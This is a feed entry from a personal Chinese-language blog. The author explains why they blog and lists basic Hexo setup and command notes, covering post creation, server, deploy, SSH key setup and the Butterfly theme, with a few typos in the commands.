    <content type="html"><![CDATA[<p>芜湖！前言不知道写啥，离了个大谱。此处省略三千个字。</p><h3 id="关于博客："><a href="#关于博客：" class="headerlink" title="关于博客："></a>关于博客：</h3><ul><li>主要写博客的原因还知识简单的将自己的学习到的知识及解决思路，整理下来，方便自己日后能用到的时候能够翻翻，快速的找到。就像高端的程序猿CV手法一样朴实无华！！！</li><li>开源还能给别人看到，供别人阅读跟学习也挺不错的。之后在网页上加点标签栏，音乐栏啥的，不然是有点单调看起来，慢慢搞吧，做样式挺复杂的。</li><li>没事干的时候写写博客，将学到的零七零八的知识点记录下来，本来记性就不好。写博客加强个人记忆，提高思维能力，好多东西看的时候可以理解，但是过了一段时间因为业务上没有用到就容易忘，如果记录下来，那相当于把自己当时理解的思路给整理下来，这样下次重新再看的时候可以很快的想起来。</li><li>第二点就是写的时候可以促进我去把一些不明白的东西弄明白，虽然没几个人看，但是如果写出来了就一定能保证自己可以把要写的整个流程捋清楚，自己掌握的东西还是自己的。芜湖！</li><li>研究官方文档，锻炼自学能力，锻炼笔记能力，锻炼项目能力</li><li>第三点当然是产生学习动力啦，督促自己多多学习，不然网站就一两篇文章，看着磕碜。<h3 id="致自己"><a href="#致自己" class="headerlink" title="致自己"></a>致自己</h3></li></ul><p>我常常觉得计算机和互联网的发明给人类带来了如此大的方便，让人们不用阅读说明书就知道如何上手，但是偏偏编程的道路又是如此艰辛。<br>BUT,担心未来，不如现在好好努力。这条路上，只有奋斗才能给你安全感。不要轻易把梦想寄托在某个人身上，也不要太在乎身旁的耳语，因为未来是你自己的，只有你自己才能给你自己最大的安全感。你说不喜欢现在的生活，不喜欢朝九晚五，不喜欢从周一忙碌到周五；你的梦想是环游世界，是睡觉睡到自然醒、数钱数到手抽筋。其实，你纯粹只是懒，是在逃避责任，生活不是励志故事，也不要再拿“梦想”这种伟大的词当借口了。不如先在有限的境地里，努力做好自己。</p><ul><li>(C站有很多大牛)</li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/95f1aa94fa79757a1c6ffeba6cbb5661.png" alt="图片"></p><hr><h3 id="Start-My-blog-journey！"><a href="#Start-My-blog-journey！" class="headerlink" title="Start My blog journey！"></a>Start My blog journey！</h3><h2 id="Hexo-命令笔记"><a href="#Hexo-命令笔记" class="headerlink" title="Hexo 命令笔记"></a>Hexo 命令笔记</h2><h3 id="vim-File-esc-SAVE-and-exit"><a href="#vim-File-esc-SAVE-and-exit" class="headerlink" title="vim File esc(SAVE and exit)"></a>vim File esc(SAVE and exit)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ esc : wq</span><br></pre></td></tr></table></figure><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><blockquote><p>小结：修改了文件，执行以下命令</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean   <span class="comment">#清理一下缓存</span></span><br><span class="line">hexo g   <span class="comment">#重新加载一下页面</span></span><br><span class="line">hexo server   <span class="comment">#重新运行 </span></span><br></pre></td></tr></table></figure><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><h3 id="安装hexo工具代码-管理员身份运行cmd"><a href="#安装hexo工具代码-管理员身份运行cmd" class="headerlink" title="安装hexo工具代码(管理员身份运行cmd)"></a>安装hexo工具代码(管理员身份运行cmd)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h3 id="在git-bash命令窗口生成ssh秘钥"><a href="#在git-bash命令窗口生成ssh秘钥" class="headerlink" title="在git bash命令窗口生成ssh秘钥"></a>在git bash命令窗口生成ssh秘钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssm-keygen -t rsa -C <span class="string">&quot;2760317896@qq.com&quot;</span></span><br></pre></td></tr></table></figure><h3 id="测试秘钥是否绑定成功"><a href="#测试秘钥是否绑定成功" class="headerlink" title="测试秘钥是否绑定成功"></a>测试秘钥是否绑定成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure><h3 id="初始化hexo-生成hexo项目"><a href="#初始化hexo-生成hexo项目" class="headerlink" title="初始化hexo(生成hexo项目)"></a>初始化hexo(生成hexo项目)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo -init</span><br></pre></td></tr></table></figure><h3 id="拉取github主题"><a href="#拉取github主题" class="headerlink" title="拉取github主题"></a>拉取github主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/hexojs/hexo-theme-phase.git themes/phase</span><br></pre></td></tr></table></figure><h2 id="Butterfly命令"><a href="#Butterfly命令" class="headerlink" title="Butterfly命令"></a>Butterfly命令</h2><ul><li>安装Butterfly命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-theme-butterfly</span><br></pre></td></tr></table></figure></li><li>安装或者切换主题后hexo s 打开<a href="http://localhost:4000/%E5%90%8E%E5%87%BA%E4%BB%A5%E4%B8%8B%E9%94%99%E8%AF%AF">http://localhost:4000/后出以下错误</a>:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extends includes/layout.pug block content <span class="comment">#recent-posts.recent-posts include includes/recent-posts.pug include includes/pagination.pug</span></span><br></pre></td></tr></table></figure>因为缺少安装pug依赖和渲染插件依赖，需要安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;芜湖！前言不知道写啥，离了个大谱。此处省略三千个字。&lt;/p&gt;
&lt;h3 id=&quot;关于博客：&quot;&gt;&lt;a href=&quot;#关于博客：&quot; class=&quot;headerlink&quot; title=&quot;关于博客：&quot;&gt;&lt;/a&gt;关于博客：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;主要写博客的原因还知识简单的将自己的</summary>
      
    
    
    
    
    <category term="记录" scheme="http://zhizhi111.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
</feed>
